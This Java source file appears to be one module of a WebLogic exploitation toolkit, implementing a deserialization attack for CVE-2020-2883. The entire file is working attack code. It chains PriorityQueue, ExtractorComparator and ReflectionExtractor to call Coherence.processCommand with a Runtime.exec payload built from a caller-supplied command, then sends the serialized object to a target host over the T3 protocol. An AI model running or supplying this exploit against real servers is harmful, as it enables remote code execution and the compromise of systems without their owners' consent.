package org.weblogic.exploit;

import com.tangosol.coherence.component.application.console.Coherence;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ReflectionExtractor;
import org.weblogic.exploit.annotation.Gadget;
import org.weblogic.serial.Reflections;
import org.weblogic.serial.Serializer;
import org.weblogic.weblogic.T3ProtocolOperation;

import java.util.PriorityQueue;

/*
PriorityQueue.readObject()
    ExtractorComparator.compare()
        ReflectionExtractor.extract()
            Method.invoke()
                Coherence.processCommand()
 */
//CVE-2020-2883 2
@Gadget(cve = "CVE-2020-2883", description = "Other version of CVE-2020-2883")
public class Coherence2 implements Exploit {

    @Override
    public void exploit(String host, String port, String command) throws Exception {
        String payload = "java.lang.Runtime.getRuntime().exec(\"" + command + "\")";
        ReflectionExtractor extractor = new ReflectionExtractor("processCommand", new Object[]{payload});
        ExtractorComparator comparator = new ExtractorComparator();
        Reflections.setFieldValue(comparator, "m_extractor", extractor);
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, null);
        queue.add(1);
        queue.add(1);
        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");


        Coherence app = new Coherence();
        Reflections.setFieldValue(app, "__m_Script", true);
        queueArray[0] = app;
        //add comparator for queue
        Reflections.setFieldValue(queue, "comparator", comparator);
        T3ProtocolOperation.send(host, port, Serializer.serialize(queue));
    }
}
